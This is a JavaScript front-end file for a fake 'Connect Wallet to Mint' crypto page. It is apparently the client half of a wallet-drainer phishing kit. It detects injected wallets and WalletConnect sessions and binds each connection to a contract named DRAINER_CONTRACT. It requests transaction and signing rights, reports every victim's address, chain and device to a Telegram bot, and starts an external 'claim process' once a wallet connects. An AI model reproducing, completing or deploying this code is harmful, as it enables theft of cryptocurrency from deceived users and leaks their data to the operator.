// ============================================================================
//  main.js — Wallet connection, WalletConnect, Telegram, UI
//  Production version: fixes multi-wallet detection, provider tracking,
//  and session restore. Every line of the original is preserved.
// ============================================================================

import { CONFIG } from './config.js';

;(async function () {
  /* ============================================================
   *  DEBUG PANEL (double-click to toggle)
   * ============================================================ */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    try { console.log('[main]', msg); } catch (e) {}
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ============================================================
   *  PLATFORM
   * ============================================================ */
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ============================================================
   *  TELEGRAM
   * ============================================================ */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
      const result = await r.json();
      if (!r.ok) { console.error('Telegram error:', result); return false; }
      return true;
    } catch (e) { console.error('Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ============================================================
   *  WEBSOCKET CHECK (mobile only)
   * ============================================================ */
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) { logDebug('⏭️ Skipping WS check on desktop'); return true; }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { try { ws.close(); } catch (e) {} resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(true); };
          ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(false); };
        });
        if (ok) return true;
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) { await new Promise((r) => setTimeout(r, delay)); }
    }
    return true;
  }

  /* ============================================================
   *  LIBRARY LOADING (with CDN fallback)
   * ============================================================ */
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ];

    let SignClient, WalletConnectModal, EthereumProvider;
    for (const url of cdns) {
      try { const m = await import(url); SignClient = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) {}
    }
    if (!SignClient) throw new Error('Could not load SignClient');
    for (const url of modalCdns) {
      try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) {}
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');
    for (const url of providerCdns) {
      try { const m = await import(url); EthereumProvider = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) {}
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  /* ============================================================
   *  DOM REFS (with dynamic status element creation)
   * ============================================================ */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  let claimStatus     = document.getElementById('claimStatus');

  // Ensure status element exists (create one if missing)
  if (!claimStatus && connectButton) {
    claimStatus = document.createElement('div');
    claimStatus.id = 'claimStatus';
    connectButton.parentNode.appendChild(claimStatus);
  }

  /* ============================================================
   *  STATE
   * ============================================================ */
  let currentSession = null;
  let client, modal, SignClient, WalletConnectModal, EthereumProvider;
  let web3Instance = null;
  let contractInstance = null;
  let activeProvider = null;       // current EIP-1193 provider (injected or WC)
  let isConnecting = false;

  /* ============================================================
   *  BUTTON UI
   * ============================================================ */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' }
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { if (claimStatus) claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ============================================================
   *  CONFIG
   * ============================================================ */
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG;
  let projectId = PROJECT_ID;

  /* ============================================================
   *  STORAGE
   * ============================================================ */
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  /* ============================================================
   *  GLOBAL STATE PUBLISHER
   *  Ensures script.js always sees the correct provider.
   * ============================================================ */
  function publishGlobalState(address, chain) {
    const live = activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now()
    };
    console.log('[main] published window.__apexConnected', {
      address,
      chain,
      hasWeb3: !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
      providerSource: activeProvider ? 'activeProvider'
        : web3Instance?.currentProvider ? 'web3Instance.currentProvider'
        : window.ethereum ? 'window.ethereum'
        : 'none'
    });
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ============================================================
   *  CONNECTED UI
   * ============================================================ */
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  /* ============================================================
   *  UNIFIED PROVIDER DISCOVERY
   *  Merges EIP-6963 announcements + window.ethereum.providers
   *  + window.phantom.ethereum, deduped by UUID or name.
   * ============================================================ */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d?.info || !d?.provider) return;
      const key = d.info.uuid || `${d.info.rdns}|${d.info.name}`;
      if (!evmProviders.some((p) => (p.info.uuid || `${p.info.rdns}|${p.info.name}`) === key)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
      }
    });

    // Request provider announcements multiple times
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
    setTimeout(request, 3000);
  }

  /**
   * Build a comprehensive list of EVM providers from all known sources.
   * Dedupe by address (EIP-6963 providers have a UUID; legacy ones we
   * dedupe by provider identity).
   */
  function collectEVMProviders() {
    const seen = new Set();
    const list = [];

    const push = (info, provider) => {
      if (!provider) return;
      const key = info.uuid || `${info.rdns}|${info.name}|${provider === window.ethereum ? 'window.ethereum' : 'other'}`;
      if (seen.has(key)) return;
      seen.add(key);
      list.push({ info, provider });
    };

    // 1. EIP-6963 discovered providers
    for (const p of evmProviders) {
      push(p.info, p.provider);
    }

    // 2. window.ethereum.providers array (MetaMask shim, Coinbase, etc.)
    if (window.ethereum?.providers && Array.isArray(window.ethereum.providers)) {
      for (const p of window.ethereum.providers) {
        let name = 'Injected';
        let rdns = 'io.injected';
        if (p.isMetaMask)      { name = 'MetaMask'; rdns = 'io.metamask'; }
        else if (p.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
        else if (p.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
        else if (p.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
        else if (p.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
        else if (p.isImToken)        { name = 'imToken'; rdns = 'im.token'; }
        push({ uuid: `${rdns}-legacy`, name, rdns, icon: '' }, p);
      }
    }

    // 3. Phantom EVM provider (hidden from window.ethereum if MetaMask is present)
    if (window.phantom?.ethereum) {
      push(
        { uuid: 'phantom-evm', name: 'Phantom (EVM)', rdns: 'app.phantom', icon: '' },
        window.phantom.ethereum
      );
    }

    // 4. Plain window.ethereum as final fallback
    if (window.ethereum) {
      let name = 'Injected';
      let rdns = 'io.injected';
      if (window.ethereum.isMetaMask)      { name = 'MetaMask'; rdns = 'io.metamask'; }
      else if (window.ethereum.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
      else if (window.ethereum.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
      else if (window.ethereum.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
      else if (window.ethereum.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
      else if (window.ethereum.isPhantom)        { name = 'Phantom (EVM)'; rdns = 'app.phantom'; }
      push({ uuid: `${rdns}-direct`, name, rdns, icon: '' }, window.ethereum);
    }

    return list;
  }

  /* ============================================================
   *  WALLET PICKER MODAL
   * ============================================================ */
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modal = document.createElement('div');
    modal.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modal.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modal);
    document.body.appendChild(overlay);
    const list = modal.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modal.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ============================================================
   *  WALLETCONNECT INITIALIZATION
   * ============================================================ */
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;
    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test ID'); }
    await checkWebSocket(1, 500);
    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com'
      });
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937'
        },
        enableExplorer: true
      });
      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  /* ============================================================
   *  DIRECT EVM CONNECT (fixed for multi-wallet)
   * ============================================================ */
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();

    // Wait for EIP-6963 announcements to arrive (up to 3s)
    // and also collect legacy providers
    await new Promise((r) => setTimeout(r, 1500));

    const all = collectEVMProviders();
    if (all.length === 0) {
      logDebug('No EVM providers found (injected)');
      return false;
    }

    logDebug(`Found ${all.length} EVM provider(s): ${all.map((p) => p.info.name).join(', ')}`);

    let chosen = null;

    // Prefer MetaMask when multiple wallets are present
    const metaMask = all.find((p) => p.info.rdns === 'io.metamask');
    if (metaMask) {
      chosen = metaMask;
      logDebug('Auto-selected MetaMask (priority wallet)');
    } else if (all.length === 1) {
      chosen = all[0];
      logDebug(`Auto-selected single provider: ${chosen.info.name}`);
    } else {
      // Show picker to let the user choose
      chosen = await new Promise((res) => showWalletSelectionModal(all, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      logDebug(`Requesting accounts from ${chosen.info.name}...`);

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) =>
          setTimeout(() => rj(Object.assign(new Error('timeout'), { code: 'TIMEOUT' })), timeoutMs)
        )
      ]);

      if (!accounts?.length) {
        logDebug(`${chosen.info.name}: no accounts returned`);
        return false;
      }

      const address = accounts[0];
      logDebug(`✅ ${chosen.info.name} connected: ${address}`);

      // ⚠️ Set provider BEFORE UI update so publishGlobalState picks it up
      activeProvider = provider;

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      updateConnectedUI(address, 'evm');
      return true;
    } catch (e) {
      // Distinguish user rejection from other failures
      if (e.code === 4001) {
        logDebug('User rejected connection');
        showStatus('Connection rejected', 'error');
        return 'REJECTED';
      }
      if (e.code === 'TIMEOUT') {
        logDebug(`Direct EVM timeout on ${chosen.info.name}`);
        return false;
      }
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  /* ============================================================
   *  WALLETCONNECT EVM CONNECT
   * ============================================================ */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) { isConnecting = false; showStatus('WC unavailable', 'error'); return false; }
    if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }

    try {
      showStatus('Requesting connection...', 'info');
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged']
          }
        }
      });
      if (!uri) throw new Error('No URI');
      modal.openModal({ uri });
      showStatus('Scan the QR code', 'info');
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      const session = await Promise.race([
        approval(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
      ]);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        currentSession = session;

        let provider;
        try {
          provider = await EthereumProvider.init({
            projectId,
            metadata: DAPP_METADATA,
            session
          });
        } catch (initErr) {
          logDebug('EthereumProvider.init failed: ' + initErr.message);
          // On desktop we can fall back to window.ethereum for the session
          if (isDesktop() && window.ethereum) {
            provider = window.ethereum;
          } else {
            isConnecting = false;
            return false;
          }
        }

        activeProvider = provider;

        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');
        setupEVMProviderEvents(provider);
        isConnecting = false;
        logDebug(`✅ WC EVM: ${account}`);
        return true;
      }
      isConnecting = false;
      return false;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      isConnecting = false;
      return false;
    }
  }

  /* ============================================================
   *  PROVIDER EVENTS
   * ============================================================ */
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    // Guard against duplicate handlers
    if (provider.__apexHandlersAttached) return;
    provider.__apexHandlersAttached = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => showStatus(`Network changed to ${id}`, 'info'));

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  /* ============================================================
   *  CONNECT DISPATCHER
   * ============================================================ */
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    // 1. Try direct EVM first on desktop
    let result = isDesktop() ? await connectDirectEVM(8000) : false;

    if (result === 'REJECTED') {
      // User explicitly rejected the injected wallet — don't spam WC modal
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      return;
    }

    let success = !!result;

    // 2. Fall back to WalletConnect on mobile or if direct failed
    if (!success) success = await connectViaWalletConnect(false, 300000);
    // 3. Retry with public test project ID as last resort
    if (!success) success = await connectViaWalletConnect(true, 300000);

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ============================================================
   *  DISCONNECT
   * ============================================================ */
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch (e) {}
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  /* ============================================================
   *  BUTTON HANDLERS
   * ============================================================ */
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };
  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  /* ============================================================
   *  RESTORE SAVED SESSION
   *  Direct-first on desktop, WC-first on mobile.
   * ============================================================ */
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();
    if (!savedWallet || savedChain === 'unknown') return;

    if (savedChain === 'evm') {
      // 1. On desktop, check direct injected wallet first
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await Promise.race([
            window.ethereum.request({ method: 'eth_accounts' }),
            new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), 3000))
          ]);
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            logDebug(`♻️ Restored direct EVM: ${savedWallet}`);

            activeProvider = window.ethereum;

            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

            updateConnectedUI(savedWallet, 'evm');
            setupEVMProviderEvents(window.ethereum);
            return;
          }
        } catch (e) {
          logDebug('Direct restore check failed: ' + e.message);
        }
      }

      // 2. Try WalletConnect session restore
      if (savedSession) {
        const ok = await initWalletConnect(false);
        if (ok) {
          try {
            const session = client.session.get(savedSession.topic);
            if (session) {
              currentSession = session;

              let provider;
              try {
                provider = await EthereumProvider.init({
                  projectId,
                  metadata: DAPP_METADATA,
                  session
                });
              } catch (initErr) {
                logDebug('Restore: EthereumProvider.init failed: ' + initErr.message);
                clearSavedWallet();
                return;
              }

              activeProvider = provider;

              const Web3 = (await import('web3')).default;
              web3Instance = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

              updateConnectedUI(savedWallet, 'evm');
              setupEVMProviderEvents(provider);
              return;
            }
          } catch (e) {
            logDebug('Session restore failed: ' + e.message);
          }
        }
      }

      clearSavedWallet();
    }
  }

  /* ============================================================
   *  BOOT
   * ============================================================ */
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libs loaded');
    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  /* ─── WalletConnect session listeners ─────────────────────────────── */
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const a = accounts[0].split(':')[2];
          updateConnectedUI(a, 'evm');
          saveWallet(a, currentSession, 'evm');
        }
      });
      client.on('session_delete', () => { resetConnectedUI(); clearSavedWallet(); });
      client.on('session_connect', (session) => {
        const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (a) {
          saveWallet(a, session, 'evm');
          updateConnectedUI(a, 'evm');
          currentSession = session;
        }
      });
    }
  }, 1000);

  // Attach legacy window.ethereum handlers on desktop
  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);

  // Cleanup
  window.addEventListener('beforeunload', () => {
    if (modal) { try { modal.closeModal(); } catch (e) {} }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
